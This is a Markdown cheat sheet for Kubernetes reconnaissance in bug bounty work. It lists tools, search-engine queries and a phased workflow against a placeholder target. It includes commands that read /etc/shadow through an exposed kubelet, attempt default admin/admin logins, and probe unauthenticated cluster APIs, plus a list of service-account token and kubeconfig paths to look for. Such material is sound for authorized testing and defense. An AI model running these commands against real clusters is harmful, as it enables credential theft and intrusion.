# Kubernetes Reconnaissance Tools for Bug Bounty

## CLI Tools

### 1. kubectl
The official Kubernetes command-line tool for interacting with clusters.
```bash
# Basic cluster info
kubectl cluster-info
kubectl version
kubectl get nodes
kubectl get namespaces
kubectl get pods --all-namespaces

# Resource enumeration
kubectl get all --all-namespaces
kubectl get secrets --all-namespaces
kubectl get configmaps --all-namespaces
kubectl get serviceaccounts --all-namespaces

# RBAC enumeration
kubectl get clusterroles
kubectl get clusterrolebindings
kubectl get roles --all-namespaces
kubectl get rolebindings --all-namespaces

# Check permissions
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets --all-namespaces
```

### 2. kubeletctl
Tool for scanning and exploiting kubelet.
```bash
# Installation
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64
mv kubeletctl_linux_amd64 /usr/local/bin/kubeletctl

# Scanning
kubeletctl scan --cidr 10.0.0.0/24
kubeletctl scan rhost <target-ip>

# Exploitation
kubeletctl pods -s <target-ip>
kubeletctl exec "whoami" -s <target-ip> -p <pod-name> -c <container-name>
kubeletctl run "cat /etc/shadow" -s <target-ip>
```

### 3. kube-hunter
Hunt for security weaknesses in Kubernetes clusters.
```bash
# Installation
pip install kube-hunter

# Run as pod
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-hunter/main/job.yaml

# Remote scanning
kube-hunter --remote <target-ip>

# Network scanning
kube-hunter --cidr 10.0.0.0/24

# Active hunting (caution!)
kube-hunter --active
```

### 4. kubeaudit
Audit Kubernetes clusters for security concerns.
```bash
# Installation
go install github.com/Shopify/kubeaudit/cmd/kubeaudit@latest

# Audit all
kubeaudit all

# Specific checks
kubeaudit apparmor
kubeaudit caps
kubeaudit hostns
kubeaudit image
kubeaudit limits
kubeaudit netpols
kubeaudit nonroot
kubeaudit privesc
kubeaudit privileged
kubeaudit rootfs
kubeaudit seccomp
```

### 5. kube-bench
Check Kubernetes deployment against CIS Kubernetes Benchmark.
```bash
# Installation
curl -L https://github.com/aquasecurity/kube-bench/releases/download/v0.7.1/kube-bench_0.7.1_linux_amd64.tar.gz -o kube-bench.tar.gz
tar -xvf kube-bench.tar.gz

# Run
./kube-bench run --targets master
./kube-bench run --targets node
./kube-bench run --targets etcd
```

### 6. kubectl-who-can
Show who has permissions to perform actions on Kubernetes resources.
```bash
# Installation
kubectl krew install who-can

# Usage
kubectl who-can get secrets
kubectl who-can create pods
kubectl who-can delete deployments
kubectl who-can '*' '*'
```

### 7. kubesploit
Penetration testing framework for Kubernetes.
```bash
# Installation
git clone https://github.com/cyberark/kubesploit
cd kubesploit
./kubesploit

# Modules
use scanner/kube/enum_pods
use scanner/kube/enum_secrets
use exploit/kube/exec_pod
```

### 8. trivy
Comprehensive security scanner.
```bash
# Installation
apt-get install trivy

# Scan cluster
trivy k8s --report summary cluster

# Scan specific resources
trivy k8s deployment/nginx
trivy k8s --namespace default all
```

### 9. kubectl-access-matrix
Show RBAC access matrix.
```bash
# Installation
kubectl krew install access-matrix

# Usage
kubectl access-matrix
kubectl access-matrix for serviceaccount:default:my-sa
```

### 10. peirates
Kubernetes penetration testing tool focusing on container escapes.
```bash
# Installation
git clone https://github.com/inguardians/peirates
cd peirates
./peirates

# Menu-driven exploitation
# - Service account token theft
# - Container escape techniques
# - Network scanning
# - Privilege escalation
```

---

## Online Tools & Services

### 1. Shodan
Search for exposed Kubernetes services.
```
Query Examples:
- "kubernetes" port:6443
- "kubernetes" port:8080
- "kubernetes" port:10250
- ssl:"Kubernetes"
- http.title:"Kubernetes"
- http.favicon.hash:-1048180861 (k8s dashboard)
```

### 2. Censys
Alternative to Shodan for finding exposed K8s services.
```
Query Examples:
- services.kubernetes.banner: *
- services.port: 6443
- services.port: 10250
- services.http.response.body: "kubernetes"
```

### 3. Binary Edge
Search for Kubernetes assets.
```
Query Examples:
- kubernetes
- port:6443
- port:10250
- "kube-apiserver"
```

### 4. Fofa
Chinese search engine for network assets.
```
Query Examples:
- app="Kubernetes"
- port="6443"
- port="10250"
- title="Kubernetes Dashboard"
```

### 5. ZoomEye
Another search engine for discovering exposed services.
```
Query Examples:
- app:"Kubernetes"
- port:6443
- port:10250
- "kubernetes-dashboard"
```

### 6. GreyNoise
Check if IP addresses are known scanners or malicious.
```
Use to verify if discovered IPs are honeypots or legitimate targets
```

### 7. crt.sh
Certificate transparency logs for finding subdomains.
```
Search Examples:
- %.kubernetes.company.com
- %.k8s.company.com
- Look for: master, node, api, dashboard, etc.
```

### 8. SecurityTrails
Historical DNS and subdomain discovery.
```
Find:
- Historical DNS records
- Subdomains related to k8s infrastructure
- SSL certificate history
```

---

## Reconnaissance Workflow

### Phase 1: Discovery
```bash
# 1. Find Kubernetes endpoints
shodan search "kubernetes port:6443"
amass enum -d target.com | grep -E '(k8s|kube|kubernetes)'

# 2. Enumerate subdomains
subfinder -d target.com -o subdomains.txt
httpx -l subdomains.txt -ports 6443,8080,10250,10255,10256

# 3. Check for exposed services
nmap -p 6443,8080,10250,10255,10256,30000-32767 target.com
```

### Phase 2: Information Gathering
```bash
# 1. Anonymous API access
curl -k https://target.com:6443/api/v1
curl -k https://target.com:6443/apis
curl -k https://target.com:6443/version

# 2. Kubelet API (10250)
curl -k https://target.com:10250/pods
curl -k https://target.com:10250/metrics

# 3. Read-only Kubelet API (10255)
curl http://target.com:10255/pods
curl http://target.com:10255/metrics
```

### Phase 3: Authentication Testing
```bash
# 1. Test for anonymous access
kubectl --insecure-skip-tls-verify --server=https://target.com:6443 get pods

# 2. Try default credentials
kubectl --username=admin --password=admin --server=https://target.com:6443 get pods

# 3. Check for exposed tokens
curl -k https://target.com:6443 -H "Authorization: Bearer <token>"
```

### Phase 4: Vulnerability Scanning
```bash
# 1. Run kube-hunter
kube-hunter --remote target.com

# 2. Scan with kubeletctl
kubeletctl scan rhost target.com

# 3. Check for CVEs
trivy k8s --report summary cluster
```

### Phase 5: Exploitation Research
```bash
# 1. Check permissions
kubectl auth can-i --list

# 2. Look for misconfigurations
kubeaudit all

# 3. Search for secrets
kubectl get secrets --all-namespaces
kubectl get configmaps --all-namespaces | grep -i password
```

---

## Common Kubernetes Ports

| Port  | Service | Description |
|-------|---------|-------------|
| 6443  | API Server | Kubernetes API (HTTPS) |
| 8080  | API Server | Kubernetes API (HTTP) - Often insecure |
| 10250 | Kubelet API | Kubelet secure port |
| 10255 | Kubelet API | Kubelet read-only port |
| 10256 | Kube-proxy | Healthz endpoint |
| 2379  | etcd | etcd client port |
| 2380  | etcd | etcd peer port |
| 30000-32767 | NodePort | NodePort service range |
| 9090  | Prometheus | Metrics (if exposed) |
| 3000  | Grafana | Dashboard (if exposed) |
| 9200  | Elasticsearch | Logging (if exposed) |
| 5601  | Kibana | Log visualization (if exposed) |

---

## Critical Files to Look For

```
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/ca.crt
/run/secrets/kubernetes.io/serviceaccount/namespace
/var/run/secrets/kubernetes.io/serviceaccount/token
/etc/kubernetes/admin.conf
/etc/kubernetes/kubelet.conf
/etc/kubernetes/controller-manager.conf
/etc/kubernetes/scheduler.conf
/root/.kube/config
/home/*/.kube/config
/var/lib/kubelet/kubeconfig
/var/lib/kubelet/config.yaml
```

---

## Environment Variables to Check

```bash
KUBERNETES_SERVICE_HOST
KUBERNETES_SERVICE_PORT
KUBERNETES_PORT
KUBERNETES_PORT_443_TCP
KUBERNETES_PORT_443_TCP_ADDR
KUBERNETES_PORT_443_TCP_PORT
KUBERNETES_PORT_443_TCP_PROTO
```

---

## Bug Bounty Tips

1. **Always get permission** before testing production clusters
2. **Check scope** - Some programs exclude infrastructure testing
3. **Look for**:
   - Exposed dashboards without authentication
   - Anonymous API access
   - Privilege escalation through RBAC misconfigurations
   - Secrets in ConfigMaps or environment variables
   - Container escape vulnerabilities
   - Network policy bypass
   - Admission controller bypass
   
4. **Common findings**:
   - Kubernetes Dashboard exposed (CVE-2018-18264)
   - Unauthenticated kubelet API (10250, 10255)
   - Exposed etcd without authentication
   - Service account token abuse
   - Overly permissive RBAC policies
   - Secrets in Git repositories
   - Exposed metrics endpoints with sensitive data

5. **Documentation**:
   - Screenshot everything
   - Document exact steps to reproduce
   - Explain the security impact
   - Suggest remediation steps

---

## Additional Resources

- [Kubernetes Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [MITRE ATT&CK for Containers](https://attack.mitre.org/matrices/enterprise/containers/)
- [Kubernetes Goat](https://github.com/madhuakula/kubernetes-goat)
- [Kubernetes Pentest Methodology](https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1)

---

## Legal Disclaimer

This information is for educational and authorized security testing purposes only. Always obtain proper authorization before testing any systems you do not own or have explicit permission to test.
